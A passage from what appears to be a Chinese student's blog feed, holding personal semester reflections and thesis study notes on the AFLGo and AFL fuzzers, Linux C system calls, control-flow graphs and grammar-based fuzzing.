但只是进度非常慢。</p><p>奶奶在家，很多东西其实也是爷爷和奶奶自己做的。有的时候把，我也不是不想帮忙，只是我也不知道自己应该干什么。由于经常去奶奶家吃饭, 做饭这个计划就又搁置啦。~~~</p><p>这个寒假，明显感觉到我对待家里人多了几分耐心。 这也说明，我心性有那么一点点的进步。</p><p>女朋友也确实留意了，虽然我非常不愿意承认自己以貌取人，但是我终究还是没逃过这一点。说到底，咱还是。。。😀</p>]]></content>
      
      
      <categories>
          
          <category> 寒假计划 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大四上 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大四上学期总结</title>
      <link href="/2022/01/06/da-si-shang-xue-qi-zong-jie/"/>
      <url>/2022/01/06/da-si-shang-xue-qi-zong-jie/</url>
      
        <content type="html"><![CDATA[<p>既然是学期总结，那总得说点自己的进步和值得记忆的事情吧。</p><p>首先。还是没有找到女朋友，<strong>一 我接触的女生确实不多</strong>，有的时候，我也很纳闷，在接触的女生中就没有一个可以使自己心动的？ 前端时间，一个关系非常好的女同学向我表白，但我真的是没有男女的情感在里面。于是我拒绝了她，不过好在大家的关系也并没有因此显的很尴尬。<strong>二 我并没有很想谈恋爱</strong> 我有我自己的生活，习惯了一个人做事情，反倒不太习惯两个人。 <strong>三 缺乏勇气</strong>  我必须承认自己是一个缺乏勇气的人，在路上看到有些稍微心动的女生，不敢上去要个微信。也许要了也是白要，我总是这样告诉自己。</p><p>接着。就是保研，这个东西确实是个惊喜吧，也确实有运气成分再里面。 我并不认为自己和优秀能扯上关系，至少在学习方面是这样的。</p><p>然后。自己把三分球慢慢地练出来了，也找到了算是比较合适的训练方法。虽然命中率还是不稳定，有的时候还是比较准的。</p><p>还有。 学着去看书，以前我总觉得看书没啥用，在静下心来去阅读一些书籍的生活，才发现，书真的是跟优秀人交流非常好的方式。如果你的生活中没有一些很厉害的人能和你交流，我觉得看他写的书，多多少少还是有些收获的。那就不能不提我看书最大的一个收获就是:<strong>不要轻易地下结论，无论是对人还是对事。</strong> 因为感觉很多事情，远远比我想象中的要复杂，或者即使它很简单，在执行的过程中依然会遇到各种非常难以解决和调和的问题。 另外就是哲学家真的很厉害，尤其是罗素*–ps 看过&lt;幸福之路&gt;，虽然没记住多少，心灵还是很受震撼的*</p><p>emm。 结交了一个非常优秀的朋友，人长得又高又帅。努力拼搏，对自己未来有规划。不像俺，没啥清晰的目标，还不如人家勤奋。</p><p>最后。 2021年的最后一天去欢乐谷体验了一把大摆锤。就是那种摆上去又把你摆下来的，不得不说，要不是没有我朋友鼓励，我还真的不敢坐。也算是挑战了自己一把，不过我还是暗暗发誓：我再也不做了。</p><p>至于活动方面，参与过学校人大换届选举，也当过核酸检测的志愿者。这些活动也更加证实我从书中获得的收获—:<strong>不要轻易地下结论，无论是对人还是对事。</strong> 动不动就开始吐槽和埋怨，既不利于事情的解决，也容易陷入片面思考的误区。</p><p>至于照片，寒假有空就把自己手机当中的照片整理一下把。</p>]]></content>
      
      
      <categories>
          
          <category> 学期总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大四上 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-AFLGo源码阅读-3</title>
      <link href="/2022/01/02/bi-she-fuzz-aflgo-yuan-ma-yue-du-3/"/>
      <url>/2022/01/02/bi-she-fuzz-aflgo-yuan-ma-yue-du-3/</url>
      
        <content type="html"><![CDATA[<h1 id="毕设-Fuzz-AFLGo源码阅读-3"><a href="#毕设-Fuzz-AFLGo源码阅读-3" class="headerlink" title="毕设-Fuzz-AFLGo源码阅读-3"></a>毕设-Fuzz-AFLGo源码阅读-3</h1><h2 id="AFL框架"><a href="#AFL框架" class="headerlink" title="AFL框架"></a>AFL框架</h2><h3 id="共享内存中的bitmap结构-amp-amp-forkserver机制"><a href="#共享内存中的bitmap结构-amp-amp-forkserver机制" class="headerlink" title="共享内存中的bitmap结构 &amp;&amp; forkserver机制"></a>共享内存中的bitmap结构 &amp;&amp; forkserver机制</h3><p>不太好描述，就直接放图上来了。  —其他的都写到注释里面了</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220118215515.jpg" alt="共享内存中的bitmap结构&amp;&amp;forkserver机制"></p><h2 id="Linux-C"><a href="#Linux-C" class="headerlink" title="Linux C"></a>Linux C</h2><h3 id="进程之间的信号是如何进行传递的"><a href="#进程之间的信号是如何进行传递的" class="headerlink" title="进程之间的信号是如何进行传递的"></a>进程之间的信号是如何进行传递的</h3><p>直接看下面的链接把</p><p><a href="https://www.bookstack.cn/read/linux-c/5016547c13b140cc.md#6b906b">https://www.bookstack.cn/read/linux-c/5016547c13b140cc.md#6b906b</a></p><h3 id="控制台和终端的关系"><a href="#控制台和终端的关系" class="headerlink" title="控制台和终端的关系"></a>控制台和终端的关系</h3><p><a href="https://www.cnblogs.com/sparkdev/p/11460821.html">https://www.cnblogs.com/sparkdev/p/11460821.html</a></p><p>在计算机里，把那套直接连接在电脑上的键盘和显示器就叫做控制台。而终端是通过串口连接上的，不是计算机自身的设备，而控制台是计算机本身就有的设备，一个计算机只有一个控制台。计算机启动的时候，所有的信息都会显示到控制台上，而不会显示到终端上。这同样说明，控制台是计算机的基本设备，而终端是附加设备。计算机操作系统中，与终端不相关的信息，比如内核消息，后台服务消息，都可以显示到控制台上，但不会显示到终端上。比如在启动和关闭 Linux 系统时，我们可以在控制台上看到很多的内核信息(下图来自 vSphere Client 中的 “Virtual Machine Console”)</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220103170553.png" alt="控制台"></p><p>现在终端和控制台都由硬件概念，逐渐演化成了软件的概念。<strong>简单的说，能直接显示系统消息的那个终端称为控制台，其他的则称为终端(控制台也是一个终端)。或者我们在平时的使用中压根就不区分 Linux 中的终端与控制台。</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220103171552.png" alt="Linux上的终端"></p><h3 id="dev-urandom-dev-null"><a href="#dev-urandom-dev-null" class="headerlink" title="/dev/urandom /dev/null"></a>/dev/urandom /dev/null</h3><p>一个是随机数生成器, 另一个相当于空文件, 所有定向到这个地方的输入都会消失。</p>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> AFLGo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-AFLGo源码阅读-2</title>
      <link href="/2021/12/22/bi-she-fuzz-aflgo-yuan-ma-yue-du-2/"/>
      <url>/2021/12/22/bi-she-fuzz-aflgo-yuan-ma-yue-du-2/</url>
      
        <content type="html"><![CDATA[<h1 id="毕设-Fuzz-AFLGo源码阅读-2"><a href="#毕设-Fuzz-AFLGo源码阅读-2" class="headerlink" title="毕设-Fuzz-AFLGo源码阅读-2"></a>毕设-Fuzz-AFLGo源码阅读-2</h1><h2 id="AFL框架"><a href="#AFL框架" class="headerlink" title="AFL框架"></a>AFL框架</h2><h3 id="共享内存中的bitmap结构"><a href="#共享内存中的bitmap结构" class="headerlink" title="共享内存中的bitmap结构"></a>共享内存中的bitmap结构</h3><p>TODO</p><h3 id="forkserver机制"><a href="#forkserver机制" class="headerlink" title="forkserver机制"></a>forkserver机制</h3><p>TODO </p><h2 id="Linux-C"><a href="#Linux-C" class="headerlink" title="Linux C"></a>Linux C</h2><h3 id="read-amp-amp-write"><a href="#read-amp-amp-write" class="headerlink" title="read &amp;&amp; write"></a>read &amp;&amp; write</h3><p>看这个书，这个上面写的很详细</p><p><a href="https://www.bookstack.cn/read/linux-c/c917e635f91d4a4f.md">https://www.bookstack.cn/read/linux-c/c917e635f91d4a4f.md</a></p><h3 id="itimerval"><a href="#itimerval" class="headerlink" title="itimerval"></a>itimerval</h3><p> <a href="https://beachboyy.blog.csdn.net/article/details/35569229?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-3.fixedcolumn&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-3.fixedcolumn">参考</a></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">struct itimerval &#123;    struct timeval it_interval; &#x2F;* 计时器重启动的间歇值 *&#x2F;    struct timeval it_value;    &#x2F;* 计时器安装后首先启动的初始值 *&#x2F;&#125;; struct timeval &#123;    long tv_sec;                &#x2F;* 秒 *&#x2F;    long tv_usec;               &#x2F;* 微妙(1&#x2F;1000000) *&#x2F;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码实现的功能：3秒钟后启动定时器，然后每隔1秒钟向终端打印count的递增值，当count到10时程序退出。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;stdio.h&gt;#include &lt;time.h&gt;#include &lt;sys&#x2F;time.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;  static int count &#x3D; 0;  void set_timer()&#123;struct itimerval itv;  itv.it_value.tv_sec &#x3D; 3;    &#x2F;&#x2F;timer start after 3 seconds lateritv.it_value.tv_usec &#x3D; 0;  itv.it_interval.tv_sec &#x3D; 1;itv.it_interval.tv_usec &#x3D; 0;  setitimer(ITIMER_REAL,&amp;itv,NULL);&#125;  void signal_handler(int m)&#123;count ++;printf(&quot;%d\n&quot;,count);&#125;  int main()&#123;signal(SIGALRM,signal_handler);set_timer();while(count &lt; 10);exit(0);return 0; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="setsid"><a href="#setsid" class="headerlink" title="setsid()"></a>setsid()</h3><p>setsid主要是重新创建一个session,子进程从父进程继承了SessionID、进程组ID和打开的终端,子进程如果要脱离父进程，不受父进程控制，我们可以用这个setsid命令</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211223200534.png" alt="setsid ping 127.0.0.1"></p><p>可以发现即使我们按下<code>ctrl+c</code> ping命令依然在执行，也就是说ping命令脱离了父进程shell的控制。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211223200711.png" alt="ps -ef | grep ping"></p><h3 id="dup2"><a href="#dup2" class="headerlink" title="dup2"></a>dup2</h3><p>去看csdn这篇博客 <a href="https://blog.csdn.net/silent123go/article/details/71108501">https://blog.csdn.net/silent123go/article/details/71108501</a></p><p>从shell中运行一个进程，默认会有3个文件描述符存在(0、１、2)，0与进程的标准输入相关联，１与进程的标准输出相关联，2与进程的标准错误输出相关联，一个进程当前有哪些打开的文件描述符可以通过/proc/进程ID/fd目录查看。</p><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>很清楚</p><p><a href="https://www.bookstack.cn/read/linux-c/f72a2171d262cc79.md#783frj">https://www.bookstack.cn/read/linux-c/f72a2171d262cc79.md#783frj</a></p><h3 id="builtin-expect"><a href="#builtin-expect" class="headerlink" title="__builtin_expect"></a>__builtin_expect</h3><p>链接：<a href="https://www.jianshu.com/p/2684613a300f">https://www.jianshu.com/p/2684613a300f</a></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#define likely(x) __builtin_expect(!!(x), 1) &#x2F;&#x2F;x很可能为真       #define unlikely(x) __builtin_expect(!!(x), 0) &#x2F;&#x2F;x很可能为假if(likely(value))  &#x2F;&#x2F;等价于 if(value)if(unlikely(value))  &#x2F;&#x2F;也等价于 if(value)example上面的代码中 gcc 编译的指令会预先读取 y &#x3D; -1 这条指令，这适合 x 的值大于 0 的概率比较小的情况。如果 x 的值在大部分情况下是大于 0 的，就应该用 likely(x &gt; 0)，这样编译出的指令是预先读取 y &#x3D; 1 这条指令了。这样系统在运行时就会减少重新取指了int x, y; if(unlikely(x &gt; 0))    y &#x3D; 1; else     y &#x3D; -1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><h3 id="fprintf"><a href="#fprintf" class="headerlink" title="fprintf"></a>fprintf</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211224190553.png" alt="fprintf"></p><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><h3 id="零碎的知识"><a href="#零碎的知识" class="headerlink" title="零碎的知识"></a>零碎的知识</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220102144443.png" alt="mov指令"></p><p><a href="https://www.cnblogs.com/lsgxeva/p/11176000.html">深入浅出GNU X86-64 汇编</a></p><p><a href="https://www.cnblogs.com/yanghong-hnu/p/4705755.html">bss段，data段、text段、堆(heap)和栈(stack)</a></p><h3 id="XMM寄存器组"><a href="#XMM寄存器组" class="headerlink" title="XMM寄存器组"></a>XMM寄存器组</h3><p>除了我们已经讨论过的寄存器，现代处理器还有一些扩展。这些扩展体现在电路上，指令集上，有时候也会扩展一些很有用的寄存器。比较著名的扩展叫作 SSE (Streaming SIMD Extensions)，该扩展加入了新的 xmm 寄存器集合：xmm0，xmm1，…，xmm15。这些寄存器为 128 位宽，常用于两种任务：</p><ul><li>浮点数运算；以及</li><li>SIMD 指令集(这种指令一条指令可以操作多条数据)<br>常用的 mov 指令没有办法操作 xmm 寄存器。movq 指令可以代替用来拷贝 xmm 寄存器的低位(128 位中的低 64 位)，操作数的其中一个可以也是 xmm 寄存器，或者通用寄存器，或者内存(也得是 64 位)。</li></ul><p>为了填满 xmm 寄存器，你有两个选择：movdqa 和 movdqu。前者可以解释为“ move aligned double quad word”，移动两个对齐的 qword。后者是未对齐的版本。</p>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> AFLGo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-AFLGo源码阅读-1</title>
      <link href="/2021/12/15/bi-she-fuzz-aflgo-yuan-ma-yue-du-1/"/>
      <url>/2021/12/15/bi-she-fuzz-aflgo-yuan-ma-yue-du-1/</url>
      
        <content type="html"><![CDATA[<h1 id="AFLGo源码阅读-1"><a href="#AFLGo源码阅读-1" class="headerlink" title="AFLGo源码阅读-1"></a>AFLGo源码阅读-1</h1><p>首先还是要从基础的C语言语句开始补起。</p><h2 id="AFL-代码覆盖率及其相关概念"><a href="#AFL-代码覆盖率及其相关概念" class="headerlink" title="AFL-代码覆盖率及其相关概念"></a>AFL-代码覆盖率及其相关概念</h2><p>原文：<a href="https://www.freebuf.com/vuls/197672.html">https://www.freebuf.com/vuls/197672.html</a></p><h3 id="1-代码覆盖率（Code-Coverage）"><a href="#1-代码覆盖率（Code-Coverage）" class="headerlink" title="1. 代码覆盖率（Code Coverage）"></a>1. 代码覆盖率（Code Coverage）</h3><p>代码覆盖率是一种度量代码的覆盖程度的方式，也就是指源代码中的某行代码是否已执行；对二进制程序，还可将此概念理解为汇编代码中的某条指令是否已执行。其计量方式很多，但无论是GCC的GCOV还是LLVM的SanitizerCoverage，都提供函数（function）、基本块（basic-block）、边界（edge）三种级别的覆盖率检测，更具体的细节可以参考LLVM的官方文档。</p><h3 id="2-基本块（Basic-Block）"><a href="#2-基本块（Basic-Block）" class="headerlink" title="2. 基本块（Basic Block）"></a>2. 基本块（Basic Block）</h3><p>缩写为BB，指一组顺序执行的指令，BB中第一条指令被执行后，后续的指令也会被全部执行，每个BB中所有指令的执行次数是相同的，也就是说一个BB必须满足以下特征：</p><ul><li>只有一个入口点，BB中的指令不是任何跳转指令的目标。</li><li>只有一个退出点，只有最后一条指令使执行流程转移到另一个BB</li></ul><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211222151025.png" alt="基本块"></p><h3 id="3-边（edge）"><a href="#3-边（edge）" class="headerlink" title="3. 边（edge）"></a>3. 边（edge）</h3><p>我们可以将程序看成一个控制流图（CFG），图的每个节点表示一个基本块，而edge就被用来表示在基本块之间的转跳。知道了每个基本块和跳转的执行次数，就可以知道程序中的每个语句和分支的执行次数，从而获得比记录BB更细粒度的覆盖率信息。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211222151136.png" alt="CFG"></p><h3 id="4-元组（tuple）"><a href="#4-元组（tuple）" class="headerlink" title="4. 元组（tuple）"></a>4. 元组（tuple）</h3><p>具体到AFL的实现中，使用二元组(branch_src, branch_dst)来记录当前基本块 + 前一基本块 的信息，从而获取目标的执行流程和代码覆盖情况，伪代码如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">cur_location <span class="token operator">=</span> <span class="token operator">&lt;</span>COMPILE_TIME_RANDOM<span class="token operator">></span><span class="token punctuation">;</span>           <span class="token comment">//用一个随机数标记当前基本块</span>shared_mem<span class="token punctuation">[</span>cur_location <span class="token operator">^</span> prev_location<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>     <span class="token comment">//将当前块和前一块异或保存到shared_mem[]</span>prev_location <span class="token operator">=</span> cur_location <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span>              <span class="token comment">//cur_location右移1位区分从当前块到当前块的转跳</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>实际插入的汇编代码，如下图所示，首先保存各种寄存器的值并设置ecx/rcx，然后调用__afl_maybe_log，这个方法的内容相当复杂，这里就不展开讲了，但其主要功能就和上面的伪代码相似，用于记录覆盖率，放入一块共享内存中。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211222151618.png" alt="IDA中的汇编代码"></p><blockquote><p>关于这个过程后续肯定要弄的非常清楚才行， 因为要添加一个基于基本块覆盖率的模拟退火算法，这样的扩展应该加在什么地方，以及怎么实现都需要把这个过程弄清楚。</p></blockquote><h2 id="C-知识"><a href="#C-知识" class="headerlink" title="C 知识"></a>C 知识</h2><h3 id="C-预处理"><a href="#C-预处理" class="headerlink" title="C 预处理"></a>C 预处理</h3><p>C 预处理器不是编译器的组成部分，但是它是编译过程中一个单独的步骤。简言之，C 预处理器只不过是一个文本替换工具而已，它们会指示编译器在实际编译之前完成所需的预处理。我们将把 C 预处理器（C Preprocessor）简写为 CPP。</p><p>所有的预处理器命令都是以井号（#）开头。它必须是第一个非空字符，为了增强可读性，预处理器指令应从第一列开始。下面列出了所有重要的预处理器指令：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211215211258.png" alt="预处理指令列表"></p><p>其他的详见菜鸟教程。<br><a href="https://www.runoob.com/cprogramming/c-preprocessors.html">https://www.runoob.com/cprogramming/c-preprocessors.html</a></p><h3 id="C-C-中-volatile-关键字详解"><a href="#C-C-中-volatile-关键字详解" class="headerlink" title="C/C++ 中 volatile 关键字详解"></a>C/C++ 中 volatile 关键字详解</h3><p>C/C++ 中的 volatile 关键字和 const 对应，用来修饰变量，通常用于建立语言级别的 memory barrier。这是 BS 在 “The C++ Programming Language” 对 volatile 修饰词的说明：</p><blockquote><p>A volatile specifier is a hint to a compiler that an object may change its value in ways not specified by the language so that aggressive optimizations must be avoided.</p></blockquote><p>volatile 关键字是一种类型修饰符，用它声明的类型变量表示可以被某些编译器未知的因素更改，比如：操作系统、硬件或者其它线程等。遇到这个关键字声明的变量，编译器对访问该变量的代码就不再进行优化，从而可以提供对特殊地址的稳定访问。声明时语法：int volatile vInt; 当要求使用 volatile 声明的变量的值的时候，<strong>系统总是重新从它所在的内存读取数据</strong>，即使它前面的指令刚刚从该处读取过数据。而且读取的数据立刻被保存。例如:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">volatile</span> <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span> a <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// 其他代码，并未明确告诉编译器，对 i 进行过操作</span><span class="token keyword">int</span> b <span class="token operator">=</span> i<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>volatile 指出 i 是随时可能发生变化的，每次使用它的时候必须从 i的地址中读取，因而编译器生成的汇编代码会重新从i的地址读取数据放在 b 中。而<strong>优化</strong>做法是，由于编译器发现两次从 i读数据的代码之间的代码没有对 i 进行过操作，它会自动把上次读的数据放在 b 中。而不是重新从 i 里面读。这样以来，如果 i是一个寄存器变量或者表示一个端口数据就容易出错，所以说<strong>volatile 可以保证对特殊地址的稳定访问</strong>。</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="程序处理中的控制流图和调用图"><a href="#程序处理中的控制流图和调用图" class="headerlink" title="程序处理中的控制流图和调用图"></a>程序处理中的控制流图和调用图</h3><h4 id="控制流图–Control-Flow-Graph"><a href="#控制流图–Control-Flow-Graph" class="headerlink" title="控制流图–Control Flow Graph"></a>控制流图–Control Flow Graph</h4><p>控制流图(Control Flow Graph, CFG)也叫控制流程图，是一个过程或程序的抽象表现，是用在编译器中的一个抽象数据结构，由编译器在内部维护，代表了一个程序执行过程中会遍历到的所有路径。它用图的形式表示一个过程内所有基本块执行的可能流向, 也能反映一个过程的实时执行过程。Frances E. Allen于1970年提出控制流图的概念。此后，控制流图成为了编译器优化和静态分析的重要工具。</p><p>原文：<br>In a control-flow graph each node in the graph represents a basic block, i.e. a straight-line piece of code without any jumps or jump targets; jump targets start a block, and jumps end a block. Directed edges are used to represent jumps in the control flow. There are, in most presentations, two specially designated blocks: the entry block, through which control enters into the flow graph, and the exit block, through which all control flow leaves.<br>译文：<br>在控制流图中，图中的每个节点代表一个基本块，即一段没有任何跳转或跳转目标的直线代码；跳转目标开始一个块，而跳转结束一个块。有向边用来表示控制流中的跳转。在大多数演示中，有两个特别指定的块：入口块，控制通过它进入流程图；出口块，所有控制流通过它离开。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211219105935.png" alt="控制流图的几种结构"></p><p><strong>特点</strong>:</p><ul><li>控制流程图是过程导向的</li><li>控制流程图显示了程序执行过程中可以遍历的所有路径</li><li>控制流程图是一个有向图</li><li>CFG 中的边描述控制流路径，节点描述基本块</li><li>每个控制流图都存在2个指定的块：Entry Block(输入块)，Exit Block(输出块)</li></ul><h4 id="函数调用图-Function-Call-Graph"><a href="#函数调用图-Function-Call-Graph" class="headerlink" title="函数调用图 Function Call Graph"></a>函数调用图 Function Call Graph</h4><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211219111655.png" alt="函数调用图"></p><h3 id="插桩怎么实现"><a href="#插桩怎么实现" class="headerlink" title="插桩怎么实现"></a>插桩怎么实现</h3><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="make-和-make-install-的区别"><a href="#make-和-make-install-的区别" class="headerlink" title="make 和 make install 的区别"></a>make 和 make install 的区别</h3><p>简单来说，make 是编译，make install 是安装。</p><p>总结：linux编译安装中configure、make和make install各自的作用</p><p>./configure是用来检测你的安装平台的目标特征的。比如它会检测你是不是有CC或GCC，并不是需要CC或GCC，它是个shell脚本。</p><p>make是用来编译的，它从Makefile中读取指令，然后编译。</p><p>make install是用来安装的，它也从Makefile中读取指令，安装到指定的位置。</p><p>1、configure</p><p>这一步一般用来生成 Makefile，为下一步的编译做准备，你可以通过在 configure 后加上参数来对安装进行控制，比如代码:./configure –prefix=/usr上面的意思是将该软件安装在 /usr 下面，执行文件就会安装在 /usr/bin.同时一些软件的配置文件你可以通过指定 –sys-config= 参数进行设定。有一些软件还可以加上 –with、–enable、–without、–disable 等等参数对编译加以控制，你可以通过允许 ./configure –help 察看详细的说明帮助。</p><p>2、make</p><p>这一步就是编译，大多数的源代码包都经过这一步进行编译（当然有些perl或Python编写的软件需要调用perl或python来进行编译）。如果 在 make 过程中出现 error ，你就要记下错误代码（注意不仅仅是最后一行），然后你可以向开发者提交 bugreport（一般在 INSTALL 里有提交地址），或者你的系统少了一些依赖库等，这些需要自己仔细研究错误代码。make 的作用是开始进行源代码编译，以及一些功能的提供，这些功能由他的 Makefile 设置文件提供相关的功能，比如 make install 一般表示进行安装，make uninstall 是卸载，不加参数就是默认的进行源代码编译。<br>make 是 Linux 开发套件里面自动化编译的一个控制程序，他通过借助 Makefile 里面编写的编译规范进行自动化的调用 gcc 、ld 以及运行某些需要的程序进行编译的程序。一般情况下，他所使用的 Makefile 控制代码，由 configure 这个设置脚本根据给定的参数和系统环境生成。</p><p>3、make install</p><p>这条命令来进行安装（当然有些软件需要先运行 make check 或 make test来进行一些测试），这一步一般需要你有 root 权限（因为要向系统写入文件）</p><blockquote><p>作者：cuteximi_1995 链接：<a href="https://www.jianshu.com/p/c70afbbf5172">https://www.jianshu.com/p/c70afbbf5172</a> 来源：简书</p></blockquote><h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><p>Makefile给我的感觉，就好像是另一种编程语言一样。</p>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> AFLGo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-论文1</title>
      <link href="/2021/12/09/bi-she-fuzz-lun-wen-1/"/>
      <url>/2021/12/09/bi-she-fuzz-lun-wen-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Directed-Greybox-Fuzzing"><a href="#Directed-Greybox-Fuzzing" class="headerlink" title="Directed Greybox Fuzzing"></a>Directed Greybox Fuzzing</h1><p>第一次完全从头看到尾的十六页的论文, 一方面是为了清楚AFLGo实现的原理, 另一方面是为开题报告积累一些材料. 后面, 还需要再把介绍AFL框架的论文看一遍. 因为AFLGo是以其为基础进行扩展的. 那想要了解地更深入, 就不可避免地要把基础搞懂.</p><p>这篇论文读下来, 发现AFLGo是在AFL的基础上添加了模拟退火算法. 其他的,因为看论文的时间过去了一段时间, 居然就都忘记了.</p><p>AFL重要的设计思想因为没有论文只能是去看项目中的txt, 很多东西也是看不太懂. 只能慢慢地硬啃了……</p>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-8</title>
      <link href="/2021/12/06/bi-she-fuzz-8/"/>
      <url>/2021/12/06/bi-she-fuzz-8/</url>
      
        <content type="html"><![CDATA[<h1 id="NoteBook阅读"><a href="#NoteBook阅读" class="headerlink" title="NoteBook阅读"></a>NoteBook阅读</h1><h1 id="Parser"><a href="#Parser" class="headerlink" title="Parser"></a>Parser</h1><p>最近看的部分都是语法部分的, 从开始我们通过<strong>语法来表述各种语言</strong>. 到后面<strong>用设计好的语法来生成字符串.</strong></p><p>但是呢, 其实也可以反过来. 就是先给一个字符串, 用这个字符串分解成语法部分—也就是前面所说的<code>the derivation tree of that string</code>.然后我们再用这个tree去生成其他的测试数据.</p><blockquote><p>不过看了后面的例子, 他的意思是这样的. 我先已经有一个语法了, 但是呢, 这个语法的效果不是很好. 那么我们就需要从样本数据中提取模板. 然后在反过头去修改我们的语法. 这样可以使产生的数据更符合我们的要求. 换句话说, 就是有效的数据占比要更大.</p></blockquote><p><strong>这部分后面的代码就不看了. 我觉得我当下的重点, 也并不是完全读懂所有的代码逻辑. 而是清楚并了解fuzz相关的背景知识, 然后再去针对性的看论文和代码. 这样效率会更高一点吧.</strong></p><hr><p>看到后面这个部分的时候, 我突然感觉对于之前语法结构的理解有一些偏差.</p><p><code>noterminal</code> <code>terminal</code> <code>symbol</code>之间的关系和区别</p><p>原文中是这么说:</p><p>In the above expression, the rule <code>&lt;expr&gt;</code> : <code>[&lt;expr&gt; + &lt;expr&gt;, &lt;expr&gt; - &lt;expr&gt;, &lt;integer&gt;] </code> corresponds to how the nonterminal <code>&lt;expr&gt;</code> might be expanded. The expression <code>&lt;expr&gt; + &lt;expr&gt;</code> corresponds to one of the alternative choices. We call this an alternative expansion for the nonterminal <code>&lt;expr&gt;</code>. Finally, in an expression <code>&lt;expr&gt; + &lt;expr&gt;</code>, each of <code>&lt;expr&gt;</code>, <code>+</code>, and <code>&lt;expr&gt;</code> are symbols in that expansion. A symbol could be either a nonterminal or a terminal symbol based on whether its expansion is available in the grammar.</p><hr>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-9</title>
      <link href="/2021/12/06/bi-she-fuzz-9/"/>
      <url>/2021/12/06/bi-she-fuzz-9/</url>
      
